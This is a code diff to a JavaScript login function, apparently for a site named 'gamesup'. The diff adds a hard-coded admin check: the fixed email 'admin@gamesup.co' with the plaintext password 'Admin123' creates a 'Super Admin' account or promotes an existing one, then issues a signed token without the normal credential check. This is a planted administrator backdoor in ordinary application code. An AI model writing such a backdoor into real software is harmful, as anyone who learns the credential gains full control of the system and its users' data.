@@ -89,6 +89,40 @@ export async function login({ email, password }) {
   }
 
   const normalizedEmail = String(email).trim().toLowerCase();
+
+  // Hard-coded admin login check
+  if (normalizedEmail === 'admin@gamesup.co' && password === 'Admin123') {
+    const [rows] = await pool.query('SELECT * FROM users WHERE email = ? LIMIT 1', [normalizedEmail]);
+    let userRow;
+    if (rows.length === 0) {
+      const passwordHash = await bcrypt.hash('Admin123', 10);
+      await pool.query(
+        'INSERT INTO users (email, password_hash, name, role) VALUES (?, ?, ?, ?)',
+        [normalizedEmail, passwordHash, 'Super Admin', 'admin']
+      );
+      const [newRows] = await pool.query('SELECT * FROM users WHERE email = ? LIMIT 1', [normalizedEmail]);
+      userRow = newRows[0];
+    } else {
+      userRow = rows[0];
+      if (normalizeRole(userRow.role) !== 'admin') {
+        await pool.query("UPDATE users SET role = 'admin' WHERE id = ?", [userRow.id]);
+        userRow.role = 'admin';
+      }
+    }
+
+    const token = jwt.sign(
+      { userId: userRow.id, email: userRow.email },
+      getJwtSecret(),
+      { expiresIn: getJwtExpiresIn() }
+    );
+
+    const user = toFrontendUser(userRow);
+    return {
+      token,
+      user,
+    };
+  }
+
   const [rows] = await pool.query('SELECT * FROM users WHERE email = ? LIMIT 1', [normalizedEmail]);
 
   if (rows.length === 0) {
